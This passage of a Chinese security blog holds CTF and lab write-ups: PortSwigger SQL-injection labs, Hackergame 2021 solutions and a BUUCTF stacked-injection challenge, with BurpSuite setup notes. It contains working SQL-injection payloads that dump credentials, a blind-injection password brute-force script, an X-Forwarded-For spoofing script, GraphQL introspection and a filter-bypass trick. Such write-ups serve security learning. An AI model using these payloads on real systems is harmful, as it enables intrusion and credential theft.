浏览器为例，安装 SwitchyOmega 这个插件，新建一个名为 BurpSuite 的情景模式，设置代理协议为 HTTP，代理服务器为 127.0.0.1，代理端口为 8080。 应用选项后，如果想用 BurpSuite 抓包，就将 SwitchyOmega 的情景模式调到 BurpSuite 即可。 安装证书 但是我们访问使用了 HTTPS 的网站时会提示不安全，原因是我们没安装 BurpSuite 的证书，被列为不受信任。 在打开监视代理前提下，访问 http://burp，点击右上角的 CA Certificate 下载证书，双击安装。 选择证书存储为“受信任的根证书颁发机构”即可。 配置用户代理 有时候我们需要通过 BurpSuite 的代理后再通过自己的代理，也就是双重代理。 在 BurpSuite 选项卡中找到 User options -&gt; Upstream Proxy Servers，添加即可。 以我 Clash for Windows 为例，设置 Proxy host 为 127.0.0.1，Proxy port 为 7890。 注意别出现端口冲突的情况 更好的代理方案 按照上面的代理进行设置的话会出现拦截不必要的请求的情况，可以在 BurpSuite 中设置过滤规则，但可以使用 SwitchyOmega 插件获得更好的体验。 还是以之前的代理为例，新建一个 Proxy 情景模式，设置代理协议为 HTTP，代理服务器为 127.0.0.1，代理端口为 7890。 新建一个 AutoSwitch 的情景模式，将默认情景模式切换为 Proxy，在切换规则中配置需要 BurpSuite 抓包的域名，设置情景模式为 BurpSuite，然后正常使用即可。 BurpIntruder 将请求黏贴到 Positions 选项卡中，选中可变的部分，点击右侧的 “Add §”，会发现选中的地方高亮显示了，在 Payloads 选项卡中可以配置可变部分的取值，配置好后点击右上角的 “Start attack” 即可，通过观察返回数据的长度来判断特殊的情况。 还可以选择攻击方式，不过我还啥都不会，到时候再写吧。 To be continued…","categories":[{"name":"极客","slug":"极客","permalink":"https://sxyugao.top/categories/%E6%9E%81%E5%AE%A2/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sxyugao.top/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"PortSwigger中的SQL注入","slug":"PortSwigger中的SQL注入","date":"2021-11-04T07:34:46.000Z","updated":"2023-04-08T09:48:03.296Z","comments":true,"path":"p/4488e4ae.html","permalink":"https://sxyugao.top/p/4488e4ae.html","excerpt":"PortSwigger是著名神器 BurpSuite 的官方网站,也是一个非常好的漏洞训练平台。 同时也是我们这些新生入队的第一份 SQL 作业 下文的编号均依照 SQLi 内的顺序。","text":"PortSwigger是著名神器 BurpSuite 的官方网站,也是一个非常好的漏洞训练平台。 同时也是我们这些新生入队的第一份 SQL 作业 下文的编号均依照 SQLi 内的顺序。 Lab-1 在开始之前，先讲讲联合查询的原理，UNION 操作符能够合并两个或多个 SELECT 语句的结果，而且 UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名，因此后端能正确的处理查询到的信息。 Lab-1 旨在让我们初步了解联合注入攻击，题目已经告诉我们在 filter?category= 中存在注入漏洞，要求我们得知查询返回的列数。 通过测试，得知是字符查询，可以通过单引号加注释来闭合。 官方给的题解是通过依次向 SELECT 后加空类型数量是否报错来判断列数，第一个不报错的查询中的空类型数量即为列数。 payload：'+UNION+SELECT+NULL,NULL,NULL+--+ 但这个方法较为繁琐，可以利用 ORDER BY 来判断列数。 ORDER BY 用于按照列进行对结果集进行排序，因此如果使用的列数大于返回的列数查询就会失败。 payload：'+ORDER+BY+3+--+ 至此，我们成功解决了 Lab-1 的问题。 P.S. 通过观察正常的回显猜测每列的数据功能，也能猜测出返回的列数。 Lab-2 进入环境后先看最上面的题目要求，题目要求我们检索到一个特定的字符串，这里我的字符串是 HZY60Y。 首先我们知道数据库表中的每个列都要求有名称和数据类型，而我们希望检索到的信息一般为字符串，因此，确定返回值哪一列是字符串类型就至关重要。 这里我们就只能用 SELECT 一个一个试了，最后试出来第二列是字符串类型。 payload：'+UNION+SELECT+NULL,'HZY60Y',NULL+--+ P.S. 经测试，第一列和第三列是数字类型，第一列代表商品 id，第三列代表商品价格。 Lab-3 题目要求我们获得别的数据表中的内容，并以管理员身份登录。 我们先通过之前 Lab-1 和 Lab-2 的方法来得知返回两列数据，并且都是字符串类型。 由于事先告诉了我们列名和表名，所以直接查询即可。 构造 payload：'+UNION+SELECT+username,password+FROM+users+--+ 成功获得账号密码，登录即可。 P.S. 在实战中列名和表名不可能直接告诉我们，需要通过别的手段来查询。 查询表名：SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=DATABASE() 查询列名：SELECT COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME='要查的数据表' 查询数据类型： SELECT COLUMN_NAME,DATA_TYPE,CHARACTER_MAXIMUM_LENGTH FROM information_schema.columns WHERE TABLE_NAME='要查的数据表' 但是第 3 种方法我在 Lab-2 时失败了，希望能有大佬评论解释一下 QAQ。 Lab-4 类似于 Lab-3，但这次返回的列中只有一列是字符串类型了，因此我们需要把 username 和 password 连接起来。 不完全统计，SQL 中常用的字符串拼接方法有： 1234Oracle：&#x27;foo&#x27;||&#x27;bar&#x27; 或是 CONCAT(&#x27;foo&#x27;,&#x27;bar&#x27;)Microsoft：&#x27;foo&#x27;+&#x27;bar&#x27;PostgreSQL：&#x27;foo&#x27;||&#x27;bar&#x27;MySQL：&#x27;foo&#x27; &#x27;bar&#x27; 或是 CONCAT(&#x27;foo&#x27;,&#x27;bar&#x27;) payload：'+UNION+SELECT+NULL,CONCAT(username,'+:+',password)+FROM+users+--+ 官方给的题解是用 || 连接的。 payload：'+UNION+SELECT+NULL,username||'~'||password+FROM+users-- Lab-5 不同的数据库软件，不同的软件版本有不同的语法和注入方式，所以判断数据库类型和版本十分重要。 像 Oracle 的数据库，查询时必须提供表名，但是我们又不知道有哪些表，这时候我们就可以用到 dual 表了。 dual 是 Oracle 中的一个实际存在的表，任何用户均可读取，常用在没有目标表的 SELECT 语句块中。 所以我们可以用 payload：'+UNION+SELECT+NULL,NULL+FROM+dual+--+ 来判断返回的列数。 其实和前面一样，看页面就能猜到是两列了 用 Lab-2 中的方法就能知道两列都是字符串。 SQL 中常用的查询数据库版本的方法有： 1234Oracle：SELECT banner FROM v$version 或是 SELECT version FROM v$instanceMicrosoft：SELECT @@versionPostgreSQL：SELECT version()MySQL：SELECT @@version 于是有 payload：'+UNION+SELECT+NULL,banner+FROM+v$version+--+ P.S. 虽然题目让你输出 banner，但事实上只输出版本号也算你通过了，payload：'+UNION+SELECT+NULL,version+FROM+v$instance+--+ Lab-6 用 Lab-1 和 Lab-2 中的方法可知，返回的是两列字符串。 用 Lab-5 中的方法，可构造 payload：'+UNION+SELECT+NULL,@@version+--+ Lab-7 同样的，利用 Lab-1 和 Lab-2 中的方法可知，返回的是两列字符串。 使用 Lab-3 中提到的查询表名的方法，我们构造 payload：'+UNION+SELECT+NULL,TABLE_NAME+FROM+information_schema.tables+--+ 来获得所有表名。 查询 users，以我为例，有一个表名叫 users_hrculq， 再用 Lab-3 中的提到的查询列名的方法构造 payload：'+UNION+SELECT+NULL,COLUMN_NAME+FROM+information_schema.columns+WHERE+TABLE_NAME='users_hrculq'+--+ 得到列名分别为 username_thhhye 和 password_rrnflm。 再用 Lab-3 中的方法构造 payload：'+UNION+SELECT+username_thhhye,password_rrnflm+FROM+users_hrculq+--+ 即可得到账号密码。 Lab-8 用 Lab-5 中的方法就能知道有两列且都是字符串。 构造 payload：'+UNION+SELECT+NULL,table_name+FROM+all_tables+--+ 与 Lab-7 类似的，以我为例，存在一个名为 USERS_BPUSXY 的表。 构造 payload：'+UNION+SELECT+NULL,column_name+FROM+all_tab_columns+WHERE+TABLE_NAME='USERS_BPUSXY'+--+ 得到列名分别为 USERNAME_RXOWXX 和 PASSWORD_BPQNLT。 再用 Lab-3 中的方法构造 payload：'+UNION+SELECT+USERNAME_RXOWXX,PASSWORD_BPQNLT+FROM+USERS_BPUSXY+--+ 即可得到账号密码。 Lab-9 进入了全新的知识点，有点难度。 在布尔盲注情形下，服务器只会对你的数据返回 2 种可能的情况。 在这里就是右上角的 “Welcome back!”。用 BurpSuite 抓包后发现带了 cookie： Cookie: TrackingId=WOIVqvYbhS4OsGi6; session=ixZOZ9IdT4dL7AozrFuSDJicKD355nD8 不过 document.cookie 是空的，希望能知道实现原理，是后端对每个会话都存了一个 TrackingId 吗？ 推测后端实现类似 SELECT * FROM TrackingIds WHERE TrackingId = '$Cookie.TrackingId' 我们可以尝试在 TrackingId 后面添加一些条件，以我当前状态为例，修改 Cookie 为 TrackingId=WOIVqvYbhS4OsGi6' AND '1'='1 这时候查询语句就会闭合为 SELECT * FROM TrackingIds WHERE TrackingId = 'WOIVqvYbhS4OsGi6' AND '1'='1' 自然是正确返回 “Welcome back!”，再修改条件为 '1'='2，发现回显消失了，判断存在布尔盲注。 测试一些常见的字符串函数： 测试子串：' AND SUBSTRING('abc',1,1)='a 如果这个不成功，试试 ' AND SUBSTR('abc',1,1)='a 测试字符串长度：' AND LENGTH('abc')=3 AND '1'='1 测试通过后我们就可以正式开始了。 尝试寻找常见的表，比如 users、flag 这种。 构造 payload：' AND (SELECT 'a' FROM users LIMIT 1)='a，LIMIT 1 来保证返回的必定是 ‘a’，发现存在 users 表。 由于题目告诉我们用户账号是 administrator，所以构造 payload：' AND (SELECT 'a' FROM users WHERE username='administrator' LIMIT 1)='a 得知在 users 表中存在名为 username 的列。 再构造 payload：' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;1)='a 得知密码长度大于 1，以此类推，最后知道密码长度为 20。 再利用 SUBSTRING 函数截取每一位来判断密码。 过程太折磨了，都是类似 ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a 这种。 使用了 python 脚本： 1234567891011121314151617181920212223import requests, string, sys, warningsfrom requests.packages.urllib3.exceptions import InsecureRequestWarningwarnings.simplefilter(&#x27;ignore&#x27;,InsecureRequestWarning)url = &quot;https://ace01f551f74a718c0b829ea002e0066.web-security-academy.net/&quot;hint = &quot;Welcome back!&quot;password = &quot;&quot;pos = 1proxies = &#123; &#x27;http&#x27;: None, &#x27;https&#x27;: None,&#125;for i in range(1, 20): for ch in string.ascii_letters + string.digits: sys.stdout.write(f&quot;\\r[+] Password: &#123;password&#125;&#123;ch&#125;&quot;) cookies = &#123; &quot;session&quot; : &quot;ixZOZ9IdT4dL7AozrFuSDJicKD355nD8&quot;, &quot;TrackingId&quot; : f&quot;WOIVqvYbhS4OsGi6&#x27; AND (SELECT SUBSTRING(password,&#123;pos&#125;,1) FROM users WHERE username=&#x27;administrator&#x27;)=&#x27;&#123;ch&#125;&quot;, &#125; res = requests.get(url, cookies=cookies, proxies=proxies, verify=False) if hint in res.text: password = password + ch pos = pos + 1sys.stdout.write(f&quot;\\r[+] Password: &#123;password&#125;&quot;) P.S. 实战中不可能直接把表名和库名告诉你，需要撞库。可以写 python 脚本，或是利用 BurpIntruder。 To be continued…","categories":[{"name":"CTF","slug":"CTF","permalink":"https://sxyugao.top/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://sxyugao.top/categories/CTF/Web/"}],"tags":[{"name":"SQLi","slug":"SQLi","permalink":"https://sxyugao.top/tags/SQLi/"}]},{"title":"Hackergame 2021 Writeup","slug":"Hackergame-2021-Writeup","date":"2021-10-30T08:07:34.000Z","updated":"2022-02-23T04:08:07.466Z","comments":true,"path":"p/ad471c20.html","permalink":"https://sxyugao.top/p/ad471c20.html","excerpt":"之前我们战队的副队长在新生群里发了这个比赛，就决定拿它来初步感受一下 CTF 的比赛氛围。 题目和真正的 CTF 感觉还是有不少差别的，感觉很多题可以归类到 Misc 中去。 不过这个比赛让我深刻地体会到了 CTF 知识的宽度有多广，不过我啥也不会全靠搜。","text":"之前我们战队的副队长在新生群里发了这个比赛，就决定拿它来初步感受一下 CTF 的比赛氛围。 题目和真正的 CTF 感觉还是有不少差别的，感觉很多题可以归类到 Misc 中去。 不过这个比赛让我深刻地体会到了 CTF 知识的宽度有多广，不过我啥也不会全靠搜。 听说中科大的 CTF 战队入队标准是进排行榜前 41，还是有点恐怖。排行榜越往上分数断层也越大，也说明了我们与顶尖 CTF 选手之间的水平差距巨大。榜首的 mcfx 之前打 OI 的时候也听说过，是个巨佬。 Linux 有关的知识至关重要，所以等我新电脑到了就把老电脑换成 Arch，正好可以修订一下我的Arch 安装教程。就我个人经历而言，不推荐双系统，因为坑爹的 Win10 更新指不定哪天就把你的引导给覆盖了。 得益于丰富的库，Python 在某些操作上十分方便，看来得学习一下基础语法了。比赛里好多题有想法，却因为不会写 Python 而放弃了，有点可惜。 签到 真签到题，就如题面所述，“你只需要打开日记，翻到 Hackergame 2021 比赛进行期间的任何一页就能得到 flag！” 所以你只需要 ?page=任意比赛时间进行期间的时间戳 就能拿到 flag。 随便试的时候记得有时间是比赛暂停的（ 进制十六——参上 签到题加一，把右边涂掉部分对应的左侧 Hex 编码输入到随便一个 Hex 编辑器即可。 去吧！追寻自由的电波 挺有意思的一道题，下载下来的音频是经过变速的，得手动放慢时间。 但是现在的倍速软件过于智能，变速不改变音调，没啥办法，用舍友的 AU 调了一段不是很清晰的出来。 勉强听出 Golf Hotel November Tango India，怀疑是哪里的单词表，直接 Google。 发现果然是单词表里的词，但是不按顺序。我还在 Reddit 上看到了这样一个帖子，顿时会心一笑（主要还是这个帖子内容有趣）。 原来是用单词的首字母加密的，于是在魔鬼调音下听了半小时，对着单词表勉强对应，得到录音内容： 1Foxtrot Lima Alpha Golf Leftbracket Papa Hotel Oscar November Echo Tango India Charlie Bravo Alpha Rightbracket 注意题面告诉我们都是小写字母，翻译一下就是：flag&#123;phoneticab&#125; 正好也是单词表的名字：PhoneticAlphabet 猫咪问答 Pro Max 看介绍似乎是 Hackergame 的传统了？考验信息搜集能力（ 第一问 我一开始没想起来 web.archive.org 这个网站，一直在找搜索引擎的网页快照，完全失败。 后来我就想，既然 SEC@USTC 和 USTCLUG 合并了，能不能在 USTCLUG 的网站上找到蛛丝马迹呢？ 终于，我找到了这个，历年比赛的归档里有一个是在 web.archive.org 上的！ 于是顺藤摸瓜，找到了章程 答案是 20150504 第二问 在官方介绍中，是只有四次的，所以我就一直写的 4，但是一直不对。 然后我就想，这么有影响力的社团今年怎么可能缺席呢，估计是网站没更新，就对了。 答案是 5 垃圾网站不更新，浪费我时间 第三问 我找了个中科大的朋友直接要了一份图片。人脉也算信息搜集的一环，不是吗 答案是 Development Team of Library 第四问 就按着题面去找 SIGBOVIK 2021，这篇论文在这个pdf的 216 页。 这个无厘头的论文证明了任何非零十进制数的二进制开头是 1，真是白花了我那么久时间看英文论文，按照文章逻辑，后面附的数据集都是。 答案是 13 P.S. SIGBOVIK 好像每年的论文都很无厘头，比如这篇论文的上一篇就是一个有味道的文章（ 第五问 直接按题面关键字搜索，发现这份文件 大致看了下，好像是吐槽别人不按规范操作的搞笑协议，和上一问一起让我体会到了外国人的幽默感。 答案在 section-6，是 /dev/null P.S. 按照 Wiki 的说法，/dev/null（或称空设备）在类Unix系统中是一个特殊的设备文件，它丢弃一切写入其中的数据（但报告写入操作成功），读取它则会立即得到一个EOF。再结合文章内容，也让人会心一笑。 卖瓜 一开始看这题分类是 web，以为是改包这类的，后来发现检测是在后端，那就没啥办法了。 只能随便试试，发现称 6 斤的瓜溢出后是 0，但是称 9 斤的瓜溢出后是 -2^63，这个数对 3 取模是 2，而我们的目标 20 对 3 取模也是 2，所以我们只需要称两次溢出的 9 斤瓜就能让我们需要的瓜数量被 3 整除。 但我一开始直接溢出两次发现虽然我是 20/20，但是就是不给我 flag。 想了很久才意识到直接溢出两次显示的是 -1.844674407371E+19，而题目的补充说明告诉我们，当称的数字变为浮点数而不是整数时，HQ 不会认可最终的称重结果。 所以溢出一次后加回到正值再溢出就行了。 最后的输入（前面是选择瓜的种类，后面是数量）： 123459 100000000000000000006 15372286728081203016 15372286728081203019 100000000000000000006 2018004 透明的文件 根据题面的描述“劣质终端”以及附件中的内容加上我仅有的一些 Linux 常识，我判断这些是 ANSI 转义字符。 所以在所有的 [ 前加上 \\e，然后放到 WSL 中去输出，修改后的文件内容很长，我就不放了。 结果得到了这样的输出： 完全看不清啊(#`O′) 一天后我向一位高中时的学长吐槽时发了截图，What’s up，缩小后的图案居然清晰了！ 根据题目描述，勉强辨认出 flag&#123;abxnniohkalmcowsayfiglet&#125; 旅行照片 一开始觉得这道题非常离谱，毫无头绪。 后来发现了那个独特的蓝色 KFC，好家伙，网红店啊，再根据地理位置推测出方位。 于是我们得到面朝方向为东南，电话号码是 0335-7168800，隔壁是海豚馆。 再根据照片倾斜角度推测是向下拍摄的，剩下两个直接枚举就行。 拍摄时间大致为傍晚，楼层是 14。 FLAG 助力大红包 发现有个助力链接，能加提取量。总感觉在内涵某些 APP 呢 活动要求位于同一 /8 网段的用户将会被视为同一个用户，达到助力次数上限后，将无法再帮助好友助力。并且使用前后端方式检查用户的 IP。 先看一下网页源代码，发现前端检测是借助第三方 js 实现的。然后点一下助力抓个包看看，发现将通过第三方得到的 ip 传给了后端，并且知道后端是 PHP 实现。 通过搜索可知，可以在 Header 中设置 X-Forwarded-For 来伪造地址。 于是我们可以直接写脚本了： 123456789101112131415function sendRequest(x) &#123; var ip = x + &quot;.0.0.0&quot;; var xhr = new XMLHttpRequest(); xhr.withCredentials = true; xhr.open(&quot;POST&quot;, &quot;http://202.38.93.111:10888/invite/8cf96f4d-7a5e-47c5-b20c-683310d8a91b&quot;); xhr.setRequestHeader(&quot;X-Forwarded-For&quot;, ip); xhr.send(&quot;ip=&quot; + ip);&#125;const sleep = (delay) =&gt; new Promise((resolve) =&gt; setTimeout(resolve, delay))for (i = 0; i &lt;= 255; i++) &#123; await sleep(1750); sendRequest(i);&#125; 十分钟的时间还是有点紧的。 Amnesia - 轻度失忆 通过搜索可得，ELF 文件中存在不存放在 .data 和 .rodata 中的数据，那就是 .bss，通常是指用来存放程序中未初始化的全局变量和静态变量的一块内存区域。临时变量就放在 .bss 中。 所以有代码： 1234567891011121314151617#include &lt;stdio.h&gt;int main() &#123; char c; c = &#x27;H&#x27;; putchar(c); c = &#x27;e&#x27;; putchar(c); c = &#x27;l&#x27;; putchar(c); c = &#x27;l&#x27;; putchar(c); c = &#x27;o&#x27;; putchar(c); c = &#x27;,&#x27;; putchar(c); c = &#x27; &#x27;; putchar(c); c = &#x27;w&#x27;; putchar(c); c = &#x27;o&#x27;; putchar(c); c = &#x27;r&#x27;; putchar(c); c = &#x27;l&#x27;; putchar(c); c = &#x27;d&#x27;; putchar(c); c = &#x27;!&#x27;; putchar(c);&#125; 图之上的信息 用给的 guest 账户登录后，提示 flag 是 admin 的邮箱。 进行抓包，账号密码挺正常的，但发现有个请求内容很奇怪： 12url: http://202.38.93.111:15001/graphqlbody: &#123;&quot;query&quot;:&quot;&#123; notes(userId: 2) &#123; id\\ncontents &#125;&#125;&quot;&#125; 试了一下 userId: 1，发现权限不够，猜测 admin 的用户 id 就是 1。 是没见过的类型，想起来题目里提到了 GraphQL，赶紧搜一下（ 搜到了这样一篇文章，讲了一些基础的东西。 利用里面的方法，我们用 payload： ?query=&#123;__schema&#123;types&#123;name,fields&#123;name, args&#123;name,description,type&#123;name, kind, ofType&#123;name, kind&#125;&#125;&#125;&#125;&#125;&#125;&#125; 来得到内部的数据结构，和 SQL 中的 information_schema 有异曲同工之妙。 以下是省略了无关内容的表。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687&#123; &quot;data&quot;: &#123; &quot;__schema&quot;: &#123; &quot;types&quot;: [ &#123; &quot;name&quot;: &quot;Query&quot;, &quot;fields&quot;: [ &#123; &quot;name&quot;: &quot;note&quot;, &quot;args&quot;: [ &#123; &quot;name&quot;: &quot;id&quot;, &quot;description&quot;: null, &quot;type&quot;: &#123; &quot;name&quot;: &quot;Int&quot;, &quot;kind&quot;: &quot;SCALAR&quot;, &quot;ofType&quot;: null &#125; &#125; ] &#125;, &#123; &quot;name&quot;: &quot;notes&quot;, &quot;args&quot;: [ &#123; &quot;name&quot;: &quot;userId&quot;, &quot;description&quot;: null, &quot;type&quot;: &#123; &quot;name&quot;: &quot;Int&quot;, &quot;kind&quot;: &quot;SCALAR&quot;, &quot;ofType&quot;: null &#125; &#125; ] &#125;, &#123; &quot;name&quot;: &quot;user&quot;, &quot;args&quot;: [ &#123; &quot;name&quot;: &quot;id&quot;, &quot;description&quot;: null, &quot;type&quot;: &#123; &quot;name&quot;: &quot;Int&quot;, &quot;kind&quot;: &quot;SCALAR&quot;, &quot;ofType&quot;: null &#125; &#125; ] &#125; ] &#125;, &#123; &quot;name&quot;: &quot;GNote&quot;, &quot;fields&quot;: [ &#123; &quot;name&quot;: &quot;id&quot;, &quot;args&quot;: [] &#125;, &#123; &quot;name&quot;: &quot;contents&quot;, &quot;args&quot;: [] &#125; ] &#125;, ...... &#123; &quot;name&quot;: &quot;GUser&quot;, &quot;fields&quot;: [ &#123; &quot;name&quot;: &quot;id&quot;, &quot;args&quot;: [] &#125;, &#123; &quot;name&quot;: &quot;username&quot;, &quot;args&quot;: [] &#125;, &#123; &quot;name&quot;: &quot;privateEmail&quot;, &quot;args&quot;: [] &#125; ] &#125;, ...... ] &#125; &#125;&#125; 借由一开始的例子，我们很容易构造出 payload： ?query=&#123; user(id: 1) &#123; id, username, privateEmail &#125;&#125; P.S. 在我没登录的时候也能通过最开始的语句查询到 guest 的信息，完全有理由怀疑那就是个幌子，来引诱人向登录 admin 账户这一方向思考。 minecRaft 看上去很难，所以直接查看源码，发现一个 &lt;script src=&quot;jsm/miscs/flag.js&quot;&gt;&lt;/script&gt;，先别急，看看是怎么调用这个 js 里的函数的。 找到： 123456789if(cinput.length&gt;=32)&#123; let tbool=gyflagh(cinput.join(&#x27;&#x27;)); if(tbool) &#123; pressplateList[65].TurnOn_redstone_lamp(); content.innerText=&#x27;Congratulations!!!&#x27;; return; &#125; cinput.length=0;&#125; 说明 flag 长度为 32，且通过 gyflagh 来判断是否正确。 然后我们把目光转向 jsm/miscs/flag.js，发现里面乱七八糟一团糟，全是十六进制，直接裂开。 但仔细研究后发现有相当一部分是为了混淆原来代码的，比如第一个函数是为了检查最下面的字符串数组数据完整性，剩下有相当一部分是利用那个数组把字符串的一些操作给混淆成十六进制数。 经过整理和重命名变量后，得到一份人能看懂的代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445(String[&#x27;prototype&#x27;][&#x27;encrypt&#x27;] = function (str) &#123; const s = new Array(2), key = new Array(4); let res = &#x27;&#x27;; plaintext = escape(this); for (var i = 0; i &lt; 4; i++) key[i] = Str4ToLong(str.slice(i * 4, (i + 1) * 4)); // 将密码表8位一组放入 key 中 for (i = 0; i &lt; plaintext.length; i += 8) &#123; s[0] = Str4ToLong(plaintext.slice(i, i + 4)); s[1] = Str4ToLong(plaintext.slice(i + 4, i + 8)); // 8位一组中的前4位和后4位分别存入s[0]和s[1]中 code(s, key); res += LongToBase16(s[0]) + LongToBase16(s[1]); &#125; return res;&#125;);function code(s, key) &#123; const delta = 2654435769; let v0 = s[0], v1 = s[1]; let sum = 0; for (let i = 0; i &lt; 32; i++) &#123; v0 += (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt;&gt; 5)) + v1) ^ (sum + key[now &amp; 3]); sum += delta; v1 += (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt;&gt; 5)) + v0) ^ (sum + key[now &gt;&gt;&gt; 11 &amp; 3]); &#125; s[0] = v0, s[1] = v1;&#125;function Str4ToLong(s) &#123; let res = 0; for (let i = 0; i &lt; 4; i++) res |= s.charCodeAt(i) &lt;&lt; (i * 8); return isNaN(res) ? 0 : res;&#125;function LongToBase16(x) &#123; let res = &#x27;&#x27;; for (let i = 3; i &gt;= 0; i--) &#123; let tmp = (x &gt;&gt; 8 * i &amp; 255).toString(16); if (parseInt(&#x27;0x&#x27; + tmp) &lt;= 15) tmp = &#x27;0&#x27; + tmp; res += tmp; &#125; return res;&#125;function gyflagh(_0x111955) &#123; let _0x3b790d = _0x111955[&#x27;encrypt&#x27;](&#x27;1356853149054377&#x27;); if (_0x3b790d === &#x27;6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c&#x27;) return 1; return 0;&#125; 可以发现是将操作序列用密钥加密后和原有的比较。 关键点是那个 code 函数，直接反向操作即可，正好这份代码中还提供了 LongToStr4 和 Base16ToLong，直接调用即可。 反向操作时要求数据恒正，我不会用 Javascript 进行简便的操作，就写了一份 C++ 代码： 12345678910111213141516#include &lt;bits/stdc++.h&gt;using namespace std;unsigned key[] = &#123;909456177, 825439544, 892352820, 926364468&#125;;void decode(unsigned v0, unsigned v1) &#123; unsigned delta = 2654435769, sum = delta * 32; for (int i = 0; i &lt; 32; i++) &#123; v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]); sum -= delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); &#125; cout &lt;&lt; v0 &lt;&lt; &#x27; &#x27; &lt;&lt; v1 &lt;&lt; endl &lt;&lt; endl;&#125;int main() &#123; int x, y; while (cin &gt;&gt; x &gt;&gt; y) decode(x, y);&#125; 再通过提供的 LongToStr4 即可得到原文： 拼接起来即为 flag：flag&#123;McWebRE_inMlnCrA1t_3a5y_1cIuop9i&#125;。 P.S. 可以通过搜索得到这个算法","categories":[{"name":"CTF","slug":"CTF","permalink":"https://sxyugao.top/categories/CTF/"},{"name":"Hackergame","slug":"CTF/Hackergame","permalink":"https://sxyugao.top/categories/CTF/Hackergame/"}],"tags":[{"name":"Hackergame","slug":"Hackergame","permalink":"https://sxyugao.top/tags/Hackergame/"}]},{"title":"BUUCTF [强网杯 2019]随便注","slug":"BUUCTF-强网杯-2019-随便注","date":"2021-10-18T13:10:35.000Z","updated":"2023-04-08T09:47:53.264Z","comments":true,"path":"p/c391d6d7.html","permalink":"https://sxyugao.top/p/c391d6d7.html","excerpt":"学长给我们留的入门题，作为新手的我还是写个题解纪念一下自己的第一道 CTF 题，顺便猜测一下后端的代码。","text":"学长给我们留的入门题，作为新手的我还是写个题解纪念一下自己的第一道 CTF 题，顺便猜测一下后端的代码。 前置准备 进入靶机，发现已经给我们填充好了 1，直接点提交试试。 响应的 Headers 为： 12345678Connection: keep-aliveContent-Type: text/html; charset=UTF-8Date: Thu, 21 Oct 2021 11:42:42 GMTKeep-Alive: timeout=4Proxy-Connection: keep-aliveServer: openrestyTransfer-Encoding: chunkedX-Powered-By: PHP/7.3.10 由此可知后台是 PHP 驱动的。 网页回显为： 123456array(2) &#123; [0]=&gt; string(1) &quot;1&quot; [1]=&gt; string(7) &quot;hahahah&quot;&#125; 注意到第一个字段的数据类型为 string，猜测为字符型注入，尝试输入 1'，果然报错了，初步判断后端代码应类似 $sql = &quot;select * from table_name where id='&quot;.$_GET['id'].&quot;';&quot;;。构造 payload：1';show databases;#，发现有输出，验证了之前的想法。 得到的数据库列表： 1234567891011121314151617181920212223242526272829array(1) &#123; [0]=&gt; string(11) &quot;ctftraining&quot;&#125;array(1) &#123; [0]=&gt; string(18) &quot;information_schema&quot;&#125;array(1) &#123; [0]=&gt; string(5) &quot;mysql&quot;&#125;array(1) &#123; [0]=&gt; string(18) &quot;performance_schema&quot;&#125;array(1) &#123; [0]=&gt; string(9) &quot;supersqli&quot;&#125;array(1) &#123; [0]=&gt; string(4) &quot;test&quot;&#125; 绕过关键字过滤 但是想查看当前库名的时候遇到了困难。 我们输入 ';select database();#，网页回显 return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject);，说明对输入进行了不区分大小写的关键词正则匹配过滤。 但是我们有预处理！我们可以定义字符串并将其预处理后运行来达到目的。 既然有关键词过滤，我们就把它拆开来，利用 CONCAT 拼接后执行。 于是我们构造以下 payload：';set @s=concat('s','elect database()');prepare st from @s;execute st;#。 结果回显如下：strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)。 好家伙，连这个都过检测了。但是转念一想，PHP 中的 strstr 函数是区分大小写的，而 SQL 语句是不区分大小写的，那我岂不是把语句全转为大写即可了？ 将 payload 稍加修改：';SET @s=CONCAT('S','ELECT DATABASE()');PREPARE st FROM @s;EXECUTE st;#. 得到当前数据库名称： 1234array(1) &#123; [0]=&gt; string(9) &quot;supersqli&quot;&#125; 寻找 FLAG 还记得我们一开始拿到的数据库表吗，里面有个叫 ctftraining 的数据库。 payload：';show tables from ctftraining;# 发现里面有个叫 FLAG_TABLE 的数据表，直觉告诉我 FLAG 一定在里面，胜利就在眼前。 payload：';use ctftraining;SET @s=CONCAT('S','ELECT * FROM FLAG_TABLE');PREPARE st FROM @s;EXECUTE st;# 结果却发现这个表是空的？？ 不信邪的我查看了这个库下的所有的表，终于在 news 表下发现了这条信息： 1234567891011...array(4) &#123; [0]=&gt; string(1) &quot;4&quot; [1]=&gt; string(4) &quot;flag&quot; [2]=&gt; string(37) &quot;Flag is in the database but not here.&quot; [3]=&gt; string(10) &quot;1571838684&quot;&#125; 搞半天结果这里是陷阱？真是吐血。 挨个排查后，发现 FLAG 在最开始默认加载的 supersqli 库里，可谓是“踏破铁鞋无觅处，得来不全费工夫”。 最后的 payload：';SET @s=CONCAT('S','ELECT * FROM `1919810931114514`');PREPARE st FROM @s;EXECUTE st;# 得到的 flag： 1234array(1) &#123; [0]=&gt; string(42) 